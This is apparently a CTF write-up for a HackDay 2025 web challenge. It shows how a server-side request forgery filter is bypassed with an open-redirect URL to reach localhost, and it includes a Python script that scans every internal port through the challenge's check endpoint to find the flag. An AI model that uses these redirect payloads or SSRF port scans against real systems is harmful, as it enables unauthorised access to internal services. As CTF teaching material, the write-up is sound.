---
title: HackDay 2025 - Super Website Verificator 3000
date: 2025-01-26
categories:
  - CTFs
  - HackDay 2025
  - Web
tags:
  - web
  - ssrf
description: Web challenge exploiting an SSRF vulnerability allowed bypassing restrictions via an Open Redirect, leading to a port scan on localhost and retrieving the flag. 🚀
---
## Description 

* Category: Web 
* Vulnerability: SSRF

> Our team of brilliant engineers has developed a highly sophisticated website designed to perform check-ups on other sites. It can even uncover hidden information, possibly concealed by some clever tricksters. Take a look and see if you can find anything!

[Link of the event](https://ctftime.org/event/2615)

## Enumeration

![](assets/img_0128_0528_bgxfj.png)

Upon inspecting the web application, we notice it allows users to make requests to other sites and display their content. This feature indicates a potential **Server-Side Request Forgery (SSRF)** vulnerability. In an SSRF attack, an attacker can manipulate the server to make requests to internal resources or services that are otherwise not accessible.


## Exploitation 

### Trying to Access Localhost

In most SSRF scenarios, attackers attempt to access **localhost** or internal network services to extract sensitive information, like private APIs, databases, or internal files. In this case, we send a request to the server using `localhost` to try and gather sensitive data :

![](assets/img_0128_0529_nhken.png)

However, the application doesn't allow direct access to `localhost` this way. When we attempt to access `http://localhost`, we get an error message.

### Exploiting Open Redirect 

We can try using an **Open Redirect**. We send a link which, when viewed, redirects the victim to the chosen domain. For example this link:

```
https://302.r3dir.me/--to/?url=http://localhost
```
- This link will appear valid, as it uses the `https://302.r3dir.me/` domain, which is accepted by the application.
- However, when the victim accesses this link, they will be redirected to `localhost`, bypassing the server's restrictions.

![](assets/img_0128_0530_fszyq.png)

### Port Scanning 

With Open Redirect in place, we can now use SSRF to perform a **port scan** on the internal network (in this case, on `localhost`). The goal is to find open ports that might be running services that could leak sensitive data.

```python
import requests
import urllib3

# Désactive les avertissements SSL pour éviter le spam dans les logs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration du proxy Burp Suite 
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
URL = "http://challenges.hackday.fr:43244/api/check"

# Fonction principale pour scanner les ports
def main():
    print("[+] Scan de ports en cours...")
    
    for port in range(1, 65536):  # Plage des ports à scanner
        payload = f'https://302.r3dir.me/--to/?url=http://localhost:{port}/'
        data = {
            "url": payload, 
            "showBody": "on"
        }
        r = requests.post(URL, data=data, verify=False, proxies=proxies)
        res_json = r.json()
        if res_json["online"] != False:
            print("[+] Port ouvert: ", port)
            print("Payload: ", payload)
    
    print("[+] Scan fini.")

# Script principal
if __name__ == "__main__":
    main()
```

The port scan results show that **port 600** is open. Using the payload targeting this port, we access the service running on `localhost:600`.

Payload:
```
https://302.r3dir.me/--to/?url=http://localhost:600/
```

![](assets/img_0128_0531_ienzk.png)

This leads us to the **flag**.

Flag : `HACKDAY{Give_ME_YOuR_L0OPb@CK}`
